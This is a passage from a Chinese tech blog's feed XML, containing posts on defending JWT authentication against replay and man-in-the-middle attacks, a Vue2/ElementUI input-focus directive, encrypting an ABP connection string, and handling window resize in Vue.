&lt;h2 id=&quot;如何防范Replay-Attacks&quot;&gt;&lt;a href=&quot;#如何防范Replay-Attacks&quot; class=&quot;headerlink&quot; title=&quot;如何防范Replay Attacks&quot;&gt;&lt;/a&gt;如何防范Replay Attacks&lt;/h2&gt;&lt;p&gt;所谓重放攻击就是攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程。比如在浏览器端通过用户名/密码验证获得签名的Token被木马窃取。即使用户登出了系统，黑客还是可以利用窃取的Token模拟正常请求，而服务器端对此完全不知道，以为JWT机制是无状态的。&lt;br&gt;针对这种情况，有几种常用做法可以用作参考：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;时间戳 +共享秘钥&lt;/li&gt;
&lt;li&gt;时间戳 +共享秘钥+黑名单&lt;h2 id=&quot;如何防范MITM-（Man-In-The-Middle）Attacks&quot;&gt;&lt;a href=&quot;#如何防范MITM-（Man-In-The-Middle）Attacks&quot; class=&quot;headerlink&quot; title=&quot;如何防范MITM （Man-In-The-Middle）Attacks&quot;&gt;&lt;/a&gt;如何防范MITM （Man-In-The-Middle）Attacks&lt;/h2&gt;所谓MITM攻击，就是在客户端和服务器端的交互过程被监听，比如像可以上网的咖啡馆的WIFI被监听或者被黑的代理服务器等；&lt;br&gt;针对这类攻击的办法使用HTTPS，包括针对分布式应用，在服务间传输像cookie这类敏感信息时也采用HTTPS；所以云计算在本质上是不安全的。&lt;blockquote&gt;
&lt;p&gt;参考目录：&lt;br&gt;&lt;a href=&quot;http://www.cnblogs.com/xiekeli/p/5607107.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/xiekeli/p/5607107.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://blog.leapoahead.com/2015/09/06/understanding-jwt/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.leapoahead.com/2015/09/06/understanding-jwt/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;几种常用的认证机制&quot;&gt;&lt;a href=&quot;#几种常用的认证机制&quot; class=&quot;headerlink&quot; title=&quot;几种常用的认证机制&quot;&gt;&lt;/a&gt;几种常用的认证机制&lt;/h1&gt;&lt;h2 id=&quot;HTTP-Basic-Auth&quot;&gt;&lt;a href=&quot;#HTTP-Basic-Auth&quot; class=&quot;headerlink&quot; title=&quot;HTTP Basic Auth&quot;&gt;&lt;/a&gt;HTTP Basic Auth&lt;/h2&gt;&lt;p&gt;HTTP Basic Auth简单点说明就是每次请求API时都提供用户的username和password，简言之，Basic Auth是配合RESTful API 使用的最简单的认证方式，只需提供用户名密码即可，但由于有把用户名密码暴露给第三方客户端的风险，在生产环境下被使用的越来越少。因此，在开发对外开放的RESTful API时，尽量避免采用HTTP Basic Auth&lt;br&gt;
    
    </summary>
    
    
      <category term="Web开发" scheme="http://qrframe.com/tags/Web%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Vue2 &amp; ElementUI实现管理后台之input获得焦点</title>
    <link href="http://qrframe.com/2017/03/04/Vue2-ElementUI%E5%AE%9E%E7%8E%B0%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E4%B9%8Binput%E8%8E%B7%E5%BE%97%E7%84%A6%E7%82%B9/"/>
    <id>http://qrframe.com/2017/03/04/Vue2-ElementUI实现管理后台之input获得焦点/</id>
    <published>2017-03-04T08:23:34.000Z</published>
    <updated>2017-12-03T08:24:50.720Z</updated>
    
    <content type="html">&lt;hr&gt;
&lt;p&gt;在Vue中要给input设置焦点，需要注册自定义指令。&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Vue.directive(&lt;span class=&quot;string&quot;&gt;&#39;focus&#39;&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;el, option&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; defClass = &lt;span class=&quot;string&quot;&gt;&#39;el-input&#39;&lt;/span&gt;, defTag = &lt;span class=&quot;string&quot;&gt;&#39;input&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; value = option.value || &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; value === &lt;span class=&quot;string&quot;&gt;&#39;boolean&#39;&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        value = &amp;#123; cls: defClass, tag: defTag, foc: value &amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        value = &amp;#123; cls: value.cls || defClass, tag: value.tag || defTag, foc: value.foc || &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt; &amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (el.classList.contains(value.cls) &amp;amp;&amp;amp; value.foc)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        el.getElementsByTagName(value.tag)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].focus();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;);&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;由于ElementUI中的el-input是一个自定义组件，并非input元素，所以需要传入组件的class和tag名称来定位组件内的原生input，并调用input的focus方法来获得焦点。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;使用的时候，分两种情况：&lt;/p&gt;
&lt;h3 id=&quot;页面中只有一个组件用到focus指令&quot;&gt;&lt;a href=&quot;#页面中只有一个组件用到focus指令&quot; class=&quot;headerlink&quot; title=&quot;页面中只有一个组件用到focus指令&quot;&gt;&lt;/a&gt;页面中只有一个组件用到focus指令&lt;/h3&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;el-input v-focus=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt;&amp;gt;&lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;el-input&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;页面中有多个组件用到focus指令&quot;&gt;&lt;a href=&quot;#页面中有多个组件用到focus指令&quot; class=&quot;headerlink&quot; title=&quot;页面中有多个组件用到focus指令&quot;&gt;&lt;/a&gt;页面中有多个组件用到focus指令&lt;/h3&gt;&lt;p&gt;此时，需要传入class和tag来定位具体的元素&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;el-input-number v-focus=&lt;span class=&quot;string&quot;&gt;&quot;&amp;#123; cls: &#39;el-input-number&#39;,tag: &#39;input&#39;, foc: focus.count &amp;#125;&quot;&lt;/span&gt;&amp;gt;&lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;el-input-number&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;补充说明：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在实际用focus指令的过程中，需要给元素添加blur事件： &lt;code&gt;v-on:blur=&amp;quot;focus.count=false&amp;quot;&lt;/code&gt;。失去焦点后一定要把focus指令对应的变量置为false，否则会导致一些不可控的bug。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;参考资料：&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;p&gt;在Vue中要给input设置焦点，需要注册自定义指令。&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Vue.directive(&lt;span class=&quot;string&quot;&gt;&#39;focus&#39;&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;el, option&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; defClass = &lt;span class=&quot;string&quot;&gt;&#39;el-input&#39;&lt;/span&gt;, defTag = &lt;span class=&quot;string&quot;&gt;&#39;input&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; value = option.value || &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; value === &lt;span class=&quot;string&quot;&gt;&#39;boolean&#39;&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        value = &amp;#123; cls: defClass, tag: defTag, foc: value &amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        value = &amp;#123; cls: value.cls || defClass, tag: value.tag || defTag, foc: value.foc || &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt; &amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (el.classList.contains(value.cls) &amp;amp;&amp;amp; value.foc)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        el.getElementsByTagName(value.tag)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].focus();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;);&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;由于ElementUI中的el-input是一个自定义组件，并非input元素，所以需要传入组件的class和tag名称来定位组件内的原生input，并调用input的focus方法来获得焦点。&lt;br&gt;
    
    </summary>
    
    
      <category term="Web开发" scheme="http://qrframe.com/tags/Web%E5%BC%80%E5%8F%91/"/>
    
      <category term="VUE" scheme="http://qrframe.com/tags/VUE/"/>
    
      <category term="ElementUI" scheme="http://qrframe.com/tags/ElementUI/"/>
    
  </entry>
  
  <entry>
    <title>在ABP框架中加密数据库连接字符串</title>
    <link href="http://qrframe.com/2017/02/15/%E5%9C%A8ABP%E6%A1%86%E6%9E%B6%E4%B8%AD%E5%8A%A0%E5%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>http://qrframe.com/2017/02/15/在ABP框架中加密数据库连接字符串/</id>
    <published>2017-02-15T08:21:27.000Z</published>
    <updated>2017-12-03T08:23:06.472Z</updated>
    
    <content type="html">&lt;hr&gt;
&lt;p&gt;将数据库连接字符串明文写在web.config中，实在是风险太大，所以开始考虑将连接字符串加密保存。由于项目使用的是ABP框架，所以还得用到一些ABP的方法。&lt;/p&gt;
&lt;p&gt;ABP中，可以使用&lt;code&gt;SimpleStringCipher&lt;/code&gt;类来对字符串进行简单的加密和解密。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;/// &amp;lt;summary&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/// 解密&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/// &amp;lt;/summary&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;public string Decrypt(string cipherText, string passPhrase = &amp;quot;gsKnGZ041HLL4IM8&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/// &amp;lt;summary&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/// 加密&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/// &amp;lt;/summary&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;public string Encrypt(string plainText, string passPhrase = &amp;quot;gsKnGZ041HLL4IM8&amp;quot;);&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;修改Web-config文件&quot;&gt;&lt;a href=&quot;#修改Web-config文件&quot; class=&quot;headerlink&quot; title=&quot;修改Web.config文件&quot;&gt;&lt;/a&gt;修改Web.config文件&lt;/h3&gt;&lt;p&gt;先执行下面的代码，来得到加密后的连接字符串&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;var str = SimpleStringCipher.Instance.Encrypt(&amp;quot;你的数据库连接字符串&amp;quot;);&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Encrypt&lt;/code&gt;方法有两个参数，第二个参数有默认值，可以不写，但是推荐传入一个自定义字符串。&lt;/p&gt;
&lt;p&gt;然后，添加一个名叫&lt;code&gt;Conn&lt;/code&gt;的&lt;code&gt;appSettings&lt;/code&gt;节点&lt;br&gt;&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;appSettings&lt;/span&gt;&amp;gt;&lt;/span&gt;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;key&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;Conn&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;加密后的字符串&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;appSettings&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;节点的值是上一步加密后的数据库连接字符串。&lt;/p&gt;
&lt;h3 id=&quot;修改EntityFramework项目的Module文件&quot;&gt;&lt;a href=&quot;#修改EntityFramework项目的Module文件&quot; class=&quot;headerlink&quot; title=&quot;修改EntityFramework项目的Module文件&quot;&gt;&lt;/a&gt;修改&lt;code&gt;EntityFramework&lt;/code&gt;项目的&lt;code&gt;Module&lt;/code&gt;文件&lt;/h3&gt;&lt;p&gt;修改&lt;code&gt;PreInitialize&lt;/code&gt;方法&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;public override void PreInitialize()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Database.SetInitializer(new CreateDatabaseIfNotExists&amp;lt;MdevcDbContext&amp;gt;());&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    //Configuration.DefaultNameOrConnectionString = &amp;quot;Default&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Configuration.DefaultNameOrConnectionString = SimpleStringCipher.Instance.Decrypt(ConfigurationManager.AppSettings[&amp;quot;Conn&amp;quot;]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;注意，如果在加密的时候传入的自定义字符串，解密的时候同样需要传入。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;p&gt;将数据库连接字符串明文写在web.config中，实在是风险太大，所以开始考虑将连接字符串加密保存。由于项目使用的是ABP框架，所以还得用到一些ABP的方法。&lt;/p&gt;
&lt;p&gt;ABP中，可以使用&lt;code&gt;SimpleStringCipher&lt;/code&gt;类来对字符串进行简单的加密和解密。&lt;br&gt;
    
    </summary>
    
    
      <category term="ABP" scheme="http://qrframe.com/tags/ABP/"/>
    
  </entry>
  
  <entry>
    <title>Vue2 &amp; ElementUI实现管理后台之监听Window.resize</title>
    <link href="http://qrframe.com/2017/01/23/Vue2%20&%20ElementUI%E5%AE%9E%E7%8E%B0%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E4%B9%8B%E7%9B%91%E5%90%ACWindow.resize/"/>
    <id>http://qrframe.com/2017/01/23/Vue2 & ElementUI实现管理后台之监听Window.resize/</id>
    <published>2017-01-23T08:15:27.000Z</published>
    <updated>2017-12-03T08:24:19.074Z</updated>
    
    <content type="html">&lt;hr&gt;
&lt;p&gt;在用Vue2&amp;amp;ElementUI实现管理后台框架的时候，碰到一个问题：&lt;strong&gt;main块的高度没有自适应&lt;/strong&gt;，页面留了一大块的空白。&lt;/p&gt;
&lt;p&gt;首先想到的就是用计算属性来实现，但是在窗口变化时，计算属性并没有变化。接着想到监听Window.resize。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;找了一下，发现一篇相关的文章：    &lt;a href=&quot;http://www.cnblogs.com/erbingbing/p/6340930.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;VueJs 监听 window.resize 方法&lt;/a&gt;&lt;br&gt;感谢作者提供的思路，确实可以解决问题。最后又尝试优化了一下：&lt;br&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;template&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;lt;div id=&quot;app&quot;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;!-- 头部导航 --&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;header&amp;gt;&amp;lt;/header&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;main v-bind:style=&quot;&amp;#123; &#39;height&#39;: mainHeight + &#39;px&#39;&amp;#125;&quot;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;/main&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;/div&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/template&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  import Lodash from &#39;lodash&#39;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  export default &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    name: &#39;app&#39;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    data: function () &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      return &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        mainHeight: document.body.clientHeight&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    mounted: function () &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      const that = this&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      // _.debounce 是一个通过 lodash 限制操作频率的函数。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      window.onresize = _.debounce(() =&amp;gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        console.log(&quot;onresize:&quot; + that.mainHeight)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        that.mainHeight = document.body.clientHeight&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;, 400)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/script&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;首先，定义 mainHeight 属性，并把 document.body.clientHeight 窗口高度的值赋给 mainHeight 属性。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;mainHeight: document.body.clientHeight&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然后，绑定内联样式：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;v-bind:style=&amp;quot;{ &amp;#39;height&amp;#39;: mainHeight + &amp;#39;px&amp;#39;}&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最后，在vue挂载之后，监听窗口的resize事件。这里用到了&lt;a href=&quot;http://lodashjs.com/docs/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Lodash&lt;/a&gt;工具库，来延迟resize的响应频率。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;window.onresize = _.debounce(() =&amp;gt; {
        console.log(&amp;quot;onresize:&amp;quot; + that.mainHeight)
        that.mainHeight = document.body.clientHeight
      }, 400)&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;p&gt;在用Vue2&amp;amp;ElementUI实现管理后台框架的时候，碰到一个问题：&lt;strong&gt;main块的高度没有自适应&lt;/strong&gt;，页面留了一大块的空白。&lt;/p&gt;
&lt;p&gt;首先想到的就是用计算属性来实现，但是在窗口变化时，计算属性并没有变化。接着想到监听Window.resize。&lt;br&gt;
    
    </summary>
    
    
